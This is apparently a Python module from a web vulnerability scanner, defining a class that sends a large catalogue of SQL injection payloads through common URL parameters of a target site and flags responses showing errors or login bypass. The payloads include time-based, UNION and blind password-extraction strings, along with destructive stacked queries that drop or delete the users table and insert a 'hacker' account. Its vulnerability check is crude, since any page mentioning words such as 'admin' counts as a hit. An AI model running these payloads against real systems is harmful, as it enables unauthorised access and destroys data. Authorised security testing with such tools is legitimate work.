# src/sql_injection.py
import requests
import logging
from urllib.parse import quote

class SQLInjectionTester:
    def __init__(self, target, config):
        self.target = target
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.vulnerable_params = []
        
        # Comprehensive SQL Injection Payloads
        self.payloads = {
            # Basic Boolean-based Blind SQLi
            'boolean_basic': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "admin' --",
                "admin' #",
                "' OR 'a'='a",
                "') OR ('1'='1",
                "\" OR \"1\"=\"1",
                "\" OR 1=1--",
            ],
            
            # Time-based Blind SQLi
            'time_based': [
                "' AND SLEEP(5)--",
                "' AND SLEEP(5)#",
                "' AND BENCHMARK(5000000,MD5('A'))--",
                "' AND pg_sleep(5)--",
                "' WAITFOR DELAY '00:00:05'--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND IF(1=1,SLEEP(5),0)--",
            ],
            
            # Error-based SQLi
            'error_based': [
                "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
                "' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--",
                "' AND 1=CAST((SELECT 1) AS int)--",
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version)),0x7e,FLOOR(RAND(0)*2))x GROUP BY x)--",
                "' OR 1=1 AND (SELECT 1 FROM (SELECT(COUNT(*)),CONCAT((SELECT @@version)),0x7e,FLOOR(RAND(0)*2))x GROUP BY x)--",
            ],
            
            # UNION-based SQLi
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT @@version,NULL--",
                "' UNION SELECT user(),version()--",
                "' UNION SELECT table_name,column_name FROM information_schema.columns--",
                "' UNION ALL SELECT NULL,NULL,NULL,@@version--",
            ],
            
            # Stacked Queries
            'stacked_queries': [
                "'; DROP TABLE users--",
                "'; DELETE FROM users--",
                "'; UPDATE users SET admin=1--",
                "'; INSERT INTO users VALUES('hacker','password')--",
                "1; EXEC sp_executesql--",
                "1'; EXEC master.dbo.sp_executesql--",
            ],
            
            # Second Order SQLi
            'second_order': [
                "admin' OR '1'='1",
                "' OR '1'='1' /*",
                "' UNION SELECT user(),version() /*",
            ],
            
            # Comment-based payloads
            'comment_based': [
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "' OR 1=1;%00",
                "' OR 1=1 AND '1'='1",
            ],
            
            # Alternative syntax payloads
            'alternative_syntax': [
                "1' AND '1'='1",
                "1' AND 1=1--",
                "1' UNION SELECT NULL--",
                "1 AND 1=1--",
                "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            ],
            
            # Encoding-based payloads
            'encoding': [
                "' OR '1'='1' /*",
                "%27 OR %271%27=%271",
                "%27 OR 1=1 --",
                "\\' OR \\'1\\'=\\'1",
            ],
            
            # MySQL specific
            'mysql_specific': [
                "' OR 1=1 LIMIT 1--",
                "' ORDER BY 1--",
                "' ORDER BY 1,2--",
                "' GROUP BY 1--",
                "' HAVING 1=1--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            ],
            
            # PostgreSQL specific
            'postgresql_specific': [
                "' OR 1=1--",
                "'; SELECT version()--",
                "' AND pg_sleep(5)--",
                "' UNION SELECT version(),NULL--",
            ],
            
            # MSSQL specific
            'mssql_specific': [
                "' OR 1=1--",
                "' WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT @@version)--",
                "' UNION SELECT @@version--",
            ],
            
            # Oracle specific
            'oracle_specific': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL FROM dual--",
                "' AND 1=1--",
            ],
            
            # SQLite specific
            'sqlite_specific': [
                "' OR 1=1--",
                "' UNION SELECT sqlite_version()--",
                "' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
            ],
            
            # Advanced blind SQLi
            'advanced_blind': [
                "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--",
                "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>5--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')--",
            ],
            
            # NoSQL injection (if applicable)
            'nosql': [
                "' OR '1'='1",
                "' OR '1'=1",
                "{'$ne':null}",
                "{'$ne':''}",
            ],
            
            # ORM-based payloads
            'orm_bypass': [
                "1' OR '1'='1",
                "1'; DROP TABLE users; --",
                "' UNION SELECT * FROM users--",
            ]
        }
    
    def generate_payloads(self):
        """Generate all payloads"""
        all_payloads = []
        for category, payload_list in self.payloads.items():
            for payload in payload_list:
                all_payloads.append({
                    'category': category,
                    'payload': payload
                })
        return all_payloads
    
    def test_all(self):
        """Test all SQL injection types"""
        findings = []
        all_payloads = self.generate_payloads()
        
        self.logger.info(f"[*] Testing {len(all_payloads)} SQL injection payloads...")
        
        for payload_obj in all_payloads:
            category = payload_obj['category']
            payload = payload_obj['payload']
            
            result = self.test_payload(category, payload)
            if result and result['vulnerable']:
                findings.append(result)
        
        return findings
    
    def test_payload(self, category, payload):
        """Test single payload"""
        params = {
            'category': payload,
            'search': payload,
            'id': payload,
            'q': payload,
            'query': payload,
            'name': payload
        }
        
        try:
            response = requests.get(
                self.target, 
                params=params, 
                timeout=self.config.get('timeout', 5),
                verify=False
            )
            
            is_vulnerable = self.check_vulnerability(response)
            
            if is_vulnerable:
                return {
                    'type': 'SQL Injection',
                    'category': category,
                    'payload': payload,
                    'vulnerable': True,
                    'status_code': response.status_code,
                    'response_length': len(response.text)
                }
        except requests.exceptions.Timeout:
            # Timeout might indicate time-based SQLi
            return {
                'type': 'SQL Injection',
                'category': category,
                'payload': payload,
                'vulnerable': True,
                'status_code': 'TIMEOUT',
                'response_length': 'N/A'
            }
        except Exception as e:
            self.logger.debug(f"Error testing payload: {e}")
        
        return None
    
    def check_vulnerability(self, response):
        """Check if response indicates vulnerability"""
        # SQL Error indicators
        sql_errors = [
            'sql syntax',
            'mysql_fetch',
            'warning: mysql',
            'unclosed quotation mark',
            'quoted string not properly terminated',
            'microsoft ole db',
            'sql server',
            'postgresql',
            'sqlite',
            'oracle error',
            'syntax error',
            'database error',
            'you have an error',
            'ora-',
            'pdo exception',
            'sqlstate',
        ]
        
        # Login bypass indicators
        bypass_indicators = [
            'welcome',
            'dashboard',
            'admin',
            'login successful',
            'welcome back',
            'authenticated',
            'logged in',
        ]
        
        response_lower = response.text.lower()
        
        # Check for SQL errors
        if any(error in response_lower for error in sql_errors):
            return True
        
        # Check for successful login bypass
        if any(indicator in response_lower for indicator in bypass_indicators):
            return True
        
        return False
    
    def get_payload_by_category(self, category):
        """Get payloads by specific category"""
        if category in self.payloads:
            return self.payloads[category]
        return []
    
    def test_specific_payload(self, payload):
        """Test a specific payload"""
        return self.test_payload('custom', payload)
    
    def count_payloads(self):
        """Count total payloads"""
        total = sum(len(p) for p in self.payloads.values())
        return total, len(self.payloads)